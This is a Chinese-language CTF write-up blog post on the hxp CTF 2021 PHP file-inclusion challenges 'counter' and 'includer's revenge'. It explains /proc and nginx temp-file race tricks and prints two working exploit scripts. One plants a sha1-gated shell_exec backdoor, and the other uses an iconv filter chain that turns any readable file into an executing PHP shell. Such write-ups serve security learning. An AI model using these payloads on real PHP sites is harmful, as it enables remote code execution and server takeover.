<h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>果然这个system有问题，这两个题都是考察的在封锁了各种之前已有操作的情况下如何再次进行文件包含。这里使用的就是这个system函数，因为system是会新开进程去进行命令执行的，因此可以把需要删除的文件名输入一串base64，这样子system对应的<code>/proc/$PID/cmdline</code>就是我们的恶意输入，且cmdline这个文件默认只读，这样子就无法写入，直接包含，由于只允许[a-zA-Z0-9]，所以我们的输入应当是base64，并使用PHP filter的base64-decode过滤器进行包含完成利用<br>之前好像又在哪听说过PHP不能读proc文件系统，可能是我的错觉吧。。。</p>
<p>怪了，怎么当初大家都没想到这个利用，反而都是用的includer’s revenge的超级条件竞争实现的</p>
<p>这里的最大问题就是pid的预测了，因为rm这个命令又活不了多久，而且我们一直在发送请求就会一直创建新的rm进程，pid持续变换，想要直接碰撞到难度略大<br>所以出题人提到了proc中的另一个文件</p>
<blockquote>
<p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;ns_last_pid (since Linux 3.3)</p>
</blockquote>
<p>This file (which is virtualized per PID namespace) displays the last PID that was allocated in this PID namespace. When the next PID is allocated, the kernel will search for the lowest unallocated PID that is greaterthan this value, and when this file is subsequently read it will show that PID.</p>
<p>通过读取这个文件能更好的对接下来可能出现的pid进行猜测并实现包含</p>
<p>以及出题人的脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>
<span class="token comment" spellcheck="true"># hxp CTF 2021 counter</span>
<span class="token keyword">import</span> requests<span class="token punctuation">,</span> threading<span class="token punctuation">,</span> time<span class="token punctuation">,</span>os<span class="token punctuation">,</span> base64<span class="token punctuation">,</span> re<span class="token punctuation">,</span> tempfile<span class="token punctuation">,</span> subprocess<span class="token punctuation">,</span>secrets<span class="token punctuation">,</span> hashlib<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> random<span class="token punctuation">,</span> signal
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse<span class="token punctuation">,</span>quote_from_bytes
<span class="token keyword">def</span> <span class="token function">urlencode</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> quote_from_bytes<span class="token punctuation">(</span>data<span class="token punctuation">,</span> safe<span class="token punctuation">)</span>

url <span class="token operator">=</span> f<span class="token string">'http://{sys.argv[1]}:{sys.argv[2]}/'</span>

backdoor_name <span class="token operator">=</span> secrets<span class="token punctuation">.</span>token_hex<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.php'</span>
secret <span class="token operator">=</span> secrets<span class="token punctuation">.</span>token_hex<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
secret_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span>secret<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] backdoor_name: '</span> <span class="token operator">+</span> backdoor_name<span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] secret: '</span> <span class="token operator">+</span> secret<span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>

code <span class="token operator">=</span> f<span class="token string">"&lt;?php if(sha1($_GET['s'])==='{secret_hash}')echo shell_exec($_GET['c']);"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> f<span class="token triple-quoted-string string">"""&lt;?php if(sha1($_GET['s'])==='{secret_hash}')file_put_contents("{backdoor_name}",$_GET['p']);/*"""</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload_encoded <span class="token operator">=</span> b<span class="token string">'abcdfg'</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>payload_encoded<span class="token punctuation">)</span>
<span class="token keyword">assert</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>b<span class="token string">'^[a-zA-Z0-9]+$'</span><span class="token punctuation">,</span> payload_encoded<span class="token punctuation">)</span>

<span class="token keyword">with</span> tempfile<span class="token punctuation">.</span>NamedTemporaryFile<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> tmp<span class="token punctuation">:</span>
    tmp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>b<span class="token string">"sh\x00-c\x00rm\x00-f\x00--\x00'"</span><span class="token operator">+</span> payload_encoded <span class="token operator">+</span>b<span class="token string">"'"</span><span class="token punctuation">)</span>
    tmp<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
    o <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'-r'</span><span class="token punctuation">,</span> f<span class="token string">'echo file_get_contents("php://filter/convert.base64-decode/resource={tmp.name}");'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
    <span class="token keyword">assert</span> payload <span class="token keyword">in</span> o

    os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span><span class="token string">'/tmp'</span><span class="token punctuation">)</span>
    subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'-r'</span><span class="token punctuation">,</span> f<span class="token string">'$_GET = ["p" => "test", "s" => "{secret}"]; include("php://filter/convert.base64-decode/resource={tmp.name}");'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> open<span class="token punctuation">(</span>backdoor_name<span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        d <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span> d <span class="token operator">==</span> <span class="token string">'test'</span>


pid <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
N <span class="token operator">=</span> <span class="token number">10</span>

done <span class="token operator">=</span> <span class="token boolean">False</span>

<span class="token keyword">def</span> <span class="token function">worker</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token operator">not</span> done<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'[+] starting include worker: {pid + i}'</span><span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
        s <span class="token operator">=</span> f<span class="token triple-quoted-string string">"""bombardier -c 1 -d 3m '{url}?page=php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3D%2Fproc%2F{pid + i}%2Fcmdline&amp;p={urlencode(code)}&amp;s={secret}' > /dev/null"""</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>s<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete_worker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token operator">not</span> done<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] starting delete worker'</span><span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
        s <span class="token operator">=</span> f<span class="token triple-quoted-string string">"""bombardier -c 8 -d 3m '{url}?page={payload_encoded.decode()}&amp;reset=1' > /dev/null"""</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>s<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>
    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>worker<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> daemon<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>delete_worker<span class="token punctuation">,</span> daemon<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">while</span> <span class="token operator">not</span> done<span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span>
            <span class="token string">'page'</span><span class="token punctuation">:</span> <span class="token string">'/proc/sys/kernel/ns_last_pid'</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'[+] pid: {pid}'</span><span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
        <span class="token keyword">if</span> int<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span>pid<span class="token operator">+</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>
            pid <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">200</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'[+] pid overflow: {pid}'</span><span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'pkill -9 -x bombardier'</span><span class="token punctuation">)</span>

        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>f<span class="token string">'{url}data/{backdoor_name}'</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span>
            <span class="token string">'s'</span> <span class="token punctuation">:</span> secret<span class="token punctuation">,</span>
            <span class="token string">'c'</span><span class="token punctuation">:</span> f<span class="token string">'id; ls -l /; /readflag; rm {backdoor_name}'</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
            done <span class="token operator">=</span> <span class="token boolean">True</span>
            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'pkill -9 -x bombardier'</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>


        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
</code></pre>
<p>直接上了一个叫bombardier的玩意进行爆破，可能python的能力是有极限的吧。。。直接搜这个名字发现是一家加拿大的公司。。。然后再认真搜一下发现是这个项目，还自带了已经编译好的release，泪目<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/codesenberg/bombardier">https://github.com/codesenberg/bombardier</a><br>不过还有一些本地验证payload的assert环节，可以学习一下</p>
<h2 id="includer’s-revenge"><a href="#includer’s-revenge" class="headerlink" title="includer’s revenge"></a>includer’s revenge</h2><p>和上一个题差不多，在配置文件上的限制一样，不过连写功能也没了</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'read'</span> <span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'read'</span> <span class="token operator">?</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>可以读文件或者包含文件</p>
<h3 id="update-1"><a href="#update-1" class="headerlink" title="update"></a>update</h3><p>果然这些功能都是假的，实际利用方案为nginx默认配置下在request body过大时会缓存request body到临时文件中。只要发送一个超长并带有PHP shell的请求体到nginx服务器上，就有机会实现一个全新的无附加功能本地文件包含<br>读功能就当不存在吧</p>
<p>这里需要解决的问题有多个</p>
<h4 id="难点1"><a href="#难点1" class="headerlink" title="难点1"></a>难点1</h4><blockquote>
<p>client_body_buffer_size:<br>Sets buffer size for reading client request body. In case the request body is larger than the buffer, the whole body or only its part is written to a temporary file. By default, buffer size is equal to two memory pages. This is 8K on x86, other 32-bit platforms, and x86-64. It is usually 16K on other 64-bit platforms.</p>
</blockquote>
<p>当request body超出如上限制时，就会创建临时文件<br>nginx是用如下方式创建临时文件的</p>
<pre class=" language-C"><code class="language-C">ngx_fd_t
ngx_open_tempfile(u_char *name, ngx_uint_t persistent, ngx_uint_t access)
{
    ngx_fd_t  fd;

    fd = open((const char *) name, O_CREAT|O_EXCL|O_RDWR,
              access ? access : 0600);

    if (fd != -1 && !persistent) {
        (void) unlink((const char *) name);
    }

    return fd;
}
</code></pre>
<p>创建之后马上删除这个文件，然后把这个文件的fd返回出去，这样子就能不留痕迹的获得一个内存中的文件句柄，在内存里进行文件读写操作。（说起来有没有能直接打开一个在内存中文件句柄的函数呢？应该会比建了又删更优雅吧？） 且临时文件一般为<code>/var/lib/nginx/body/000000xxxx</code>，文件名是一个十位向左填充0的数字。文件名的数字随着nginx的请求处理增长而增长。想要直接爆破出文件名也显得不是非常的可能，更不用说在爆破文件名的同时还要条件竞争了。</p>
<p>为了研究一下创建文件马上删掉之后的表现，我写了一个垃圾的C代码（请忽略各种会造成溢出的代码）</p>
<pre class=" language-C"><code class="language-C">#include <unistd.h>
#include <sys types.h>
#include <sys stat.h>
#include <fcntl.h>
#include <stdio.h>

void main() {
    char buffer[128] = { 0 }, s[128] = { 0 }, name[32] = {0};
    printf("Enter a name :");
    gets(name);
    int fd = open((const char*)name, O_CREAT | O_EXCL | O_RDWR, 0600);

    if (fd != -1) {
        (void)unlink((const char*)name);
    }


    printf("Enter a value :");
    gets(s);

    write(fd, s, sizeof(s));

    lseek(fd, 0, SEEK_SET);
    printf("Wait for input\n");
    getchar();

    read(fd, buffer, sizeof(buffer));
    printf("%s", buffer);
}
</stdio.h></fcntl.h></sys></sys></unistd.h></code></pre>
<p>也就是模仿他的操作，新开一个文件然后马上删掉，再对这个文件的fd进行读写操作，看会发生什么。</p>
<pre class=" language-bash"><code class="language-bash">root@myserver:~/test<span class="token comment" spellcheck="true"># ./main</span>
Enter a name :testfile
fd is 3
Enter a value :aaaaaaaaaaaa
Wait <span class="token keyword">for</span> input
d
aaaaaaaaaaaa
</code></pre>
<p>在wait for input时新开一个终端</p>
<pre class=" language-bash"><code class="language-bash">root@myserver:/proc/20006/fd<span class="token comment" spellcheck="true"># ps aux | grep main</span>
postgres   592  0.0  0.7 294704 14388 ?        S     2021   7:03 /usr/lib/postgresql/9.5/bin/postgres -D /var/lib/postgresql/9.5/main -c config_file<span class="token operator">=</span>/etc/postgresql/9.5/main/postgresql.conf
root     20148  0.0  0.0   4356   644 pts/0    S+   11:33   0:00 ./main
root     20153  0.0  0.0  14228   956 pts/1    S+   11:33   0:00 <span class="token function">grep</span> --color<span class="token operator">=</span>auto main
root@myserver:/proc/20006/fd<span class="token comment" spellcheck="true"># cd /proc/20148/fd</span>
root@myserver:/proc/20148/fd<span class="token comment" spellcheck="true"># ll</span>
total 0
dr-x------ 2 root root  0 Jan  5 11:33 ./
dr-xr-xr-x 9 root root  0 Jan  5 11:33 <span class="token punctuation">..</span>/
lrwx------ 1 root root 64 Jan  5 11:33 0 -<span class="token operator">></span> /dev/pts/0
lrwx------ 1 root root 64 Jan  5 11:33 1 -<span class="token operator">></span> /dev/pts/0
lrwx------ 1 root root 64 Jan  5 11:33 2 -<span class="token operator">></span> /dev/pts/0
lrwx------ 1 root root 64 Jan  5 11:33 3 -<span class="token operator">></span> /root/test/testfile <span class="token punctuation">(</span>deleted<span class="token punctuation">)</span>
root@myserver:/proc/20148/fd<span class="token comment" spellcheck="true"># cat 3</span>
aaaaaaaaaaaaroot@myserver:/proc/20148/fd<span class="token comment" spellcheck="true">#</span>
</code></pre>
<p>可以看到，在对应进程的proc目录下，存在对应的fd项目，且为一个软链接，连接到<code>/root/test/testfile (deleted)</code>，表明该文件已被删除，但仍然可以继续写入并读出</p>
<p>因此，只要能找到对应的nginx worker线程，并尝试爆破出该临时文件的fd，就可以对我们发送的payload进行包含。这样的操作同样绕过了nginx临时文件编号不可预知的限制，且该fd在nginx处理该请求时会一直存在，也放宽了条件竞争的难度（既然如此，能不能手写socket卡住这个执行，让这个fd长时间的存在呢？不过这样子也就要求nginx在收到的请求大于限制时就进行写入，而不是收到完整请求后再判断大小进行写入，不知道具体是怎么处理的）</p>
<h4 id="难点2"><a href="#难点2" class="headerlink" title="难点2"></a>难点2</h4><p>虽然pasten的wp中提到proc中的文件既表现的像软链接又表现的像硬链接，但ls一下的话显示的文件类型还是软链接。<br>对于软链接文件，PHP会尝试先对软链接进行解析，再将其打开。<br>而这里有一个有意思的东西</p>
<blockquote>
<p>If a file was deleted while a process holds an open file descriptor:</p>
</blockquote>
<p>realpath() will return the last path of the file with “ (deleted)” appended to it.<br>open() will return an fd that can be used to read the original file content.</p>
<p>解析软链接会得到那个带(deleted)的结果，这个时候再去open就会失败，因此，这个竞争需要在文件创建但还未删除的两行代码的夹缝中艰难生存。<br>除此之外，PHP对于软链接的解析还有一层缓存</p>
<pre><code>realpath_cache_size default 4M
realpath_cahce_ttl default 120s
</code></pre>
<p>一次解析失败，就能导致接下来两分钟的解析直接走的缓存内容，无法继续竞争。为了解决这个问题，又使用了<code>/proc/$PID/root</code>和<code>/proc/$PID/cwd</code>两个目录轮流嵌套，使得每次的路径都是全新的路径，不会进入缓存<br>然后就是高强度竞争环节了。可能根据Pasten战队的说法，一般的电脑竞争不动，得加钱 :(</p>
<h5 id="官方绕过软链接方案"><a href="#官方绕过软链接方案" class="headerlink" title="官方绕过软链接方案"></a>官方绕过软链接方案</h5><p>出题人提出了另一种绕过PHP解析软链接的方法，直接加一层相对目录跳起来，就能防止PHP对软链接进行解析（可能是因为源码中解析相对路径和解析软链接的逻辑是互斥的？）<br>这样子条件竞争的难度就大幅下降了，只要能竞争到proc中的fd即可完成包含<br>大概就是这个样子<br><code>/proc/self/fd/34/../../../34/fd/9</code></p>
<h5 id="学一些其他的操作"><a href="#学一些其他的操作" class="headerlink" title="学一些其他的操作"></a>学一些其他的操作</h5><p>扫<code>/proc/$PID/cmdline</code>来确定进程是否是nginx worker进程，<code>/proc/cpuinfo</code>看CPU有几个核，<code>/proc/sys/kernel/pid_max</code>看最大pid是多少，确定扫描范围</p>
<h4 id="LFI的最终通杀"><a href="#LFI的最终通杀" class="headerlink" title="LFI的最终通杀"></a>LFI的最终通杀</h4><p>在赛后有一个师傅提出了在不留下文件的情况下包含PHP shell，而利用的条件仅仅是存在一个可读的文件<br>使用PHP filter的iconv字符转换功能，通过非常究极的排列组合，完成了从任意字符串转换到一个PHPshell的功能<br>这个是不是无敌了啊？当文件名完全可控时，文件内容也就约等于完全可控了<br>具体文章和脚本如下<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">Solving “includer’s revenge” from hxp ctf 2021 without controlling any files</a></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://localhost/index.php"</span>
file_to_use <span class="token operator">=</span> <span class="token string">"/etc/passwd"</span>
command <span class="token operator">=</span> <span class="token string">"/readflag"</span>

<span class="token comment" spellcheck="true">#&lt;?=`$_GET[0]`;;?></span>
base64_payload <span class="token operator">=</span> <span class="token string">"PD89YCRfR0VUWzBdYDs7Pz4"</span>

conversions <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'R'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'B'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'C'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR'</span><span class="token punctuation">,</span>
    <span class="token string">'8'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'9'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB'</span><span class="token punctuation">,</span>
    <span class="token string">'f'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213'</span><span class="token punctuation">,</span>
    <span class="token string">'s'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61'</span><span class="token punctuation">,</span>
    <span class="token string">'z'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS'</span><span class="token punctuation">,</span>
    <span class="token string">'U'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932'</span><span class="token punctuation">,</span>
    <span class="token string">'P'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213'</span><span class="token punctuation">,</span>
    <span class="token string">'V'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5'</span><span class="token punctuation">,</span>
    <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'Y'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'W'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'d'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'D'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'7'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'4'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'</span>
<span class="token punctuation">}</span>


<span class="token comment" spellcheck="true"># generate some garbage base64</span>
filters <span class="token operator">=</span> <span class="token string">"convert.iconv.UTF8.CSISO2022KR|"</span>
filters <span class="token operator">+=</span> <span class="token string">"convert.base64-encode|"</span>
<span class="token comment" spellcheck="true"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span>
filters <span class="token operator">+=</span> <span class="token string">"convert.iconv.UTF8.UTF7|"</span>


<span class="token keyword">for</span> c <span class="token keyword">in</span> base64_payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        filters <span class="token operator">+=</span> conversions<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"|"</span>
        <span class="token comment" spellcheck="true"># decode and reencode to get rid of everything that isn't valid base64</span>
        filters <span class="token operator">+=</span> <span class="token string">"convert.base64-decode|"</span>
        filters <span class="token operator">+=</span> <span class="token string">"convert.base64-encode|"</span>
        <span class="token comment" spellcheck="true"># get rid of equal signs</span>
        filters <span class="token operator">+=</span> <span class="token string">"convert.iconv.UTF8.UTF7|"</span>

filters <span class="token operator">+=</span> <span class="token string">"convert.base64-decode"</span>

final_payload <span class="token operator">=</span> f<span class="token string">"php://filter/{filters}/resource={file_to_use}"</span>

r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span>
    <span class="token string">"0"</span><span class="token punctuation">:</span> command<span class="token punctuation">,</span>
    <span class="token string">"action"</span><span class="token punctuation">:</span> <span class="token string">"include"</span><span class="token punctuation">,</span>
    <span class="token string">"file"</span><span class="token punctuation">:</span> final_payload
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
<p>以及一个wupoc师傅fuzz出的完整字符集<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">PHP_INCLUDE_TO_SHELL_CHAR_DICT</a></p>
<p>这里还有一个额外的文章提到了和filter相关的各种操作。提到了一个文档中没提到的filter <code>consumed</code><br>功能就是把读入直接变成一个空字符串，似乎只在读链上生效，写入的时候没用作用，那么意义是什么呢？<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.ambionics.io/blog/laravel-debug-rce">LARAVEL &lt;&#x3D; V8.4.2 DEBUG MODE: REMOTE CODE EXECUTION</a></p>
<h4 id="其他的杂七杂八"><a href="#其他的杂七杂八" class="headerlink" title="其他的杂七杂八"></a>其他的杂七杂八</h4><p>PHP怎么能读nginx的proc呢？因为PHP和nginx是同一个用户部署的，都是www-data，所以就有对应的文件权限咯</p>
<p>counter也能用这个竞争去打，但打起来需要再进一步，再多一个file_put_contents的竞争，双重竞争难度++，简单的说就是得加钱。</p>
<p>还有一些加强条件竞争成功率的辅助手段，例如使用如下代码创建一个http连接池，取消tcp三次握手的时延，更高强度的进行竞争</p>
